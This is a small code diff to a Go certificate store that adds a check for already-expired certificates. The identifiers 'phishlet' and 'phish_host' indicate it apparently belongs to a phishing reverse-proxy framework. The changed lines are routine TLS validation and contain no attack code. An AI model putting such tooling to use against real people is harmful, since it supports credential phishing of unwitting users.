@@ -304,9 +304,15 @@ func (d *CertDb) loadPhishletCertificate(site_name string, base_domain string, d
 		}
 	}
 
-	// if the certificate expires in less than one week, regenerate it
+	// check if the certificate is expired
+	now := time.Now()
+	if now.After(cert_x509.NotAfter) {
+		return fmt.Errorf("the certificate is expired")
+	}
+
+	// check if the certificate expires in less than one week
 	one_week := 7 * 24 * time.Hour
-	next_week := time.Now().Add(one_week)
+	next_week := now.Add(one_week)
 	if next_week.After(cert_x509.NotAfter) {
 		return fmt.Errorf("the certificate expires in less than a week")
 	}
@@ -478,3 +484,4 @@ func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int
 	d.tls_cache[host] = cert
 	return cert, nil
 }
+
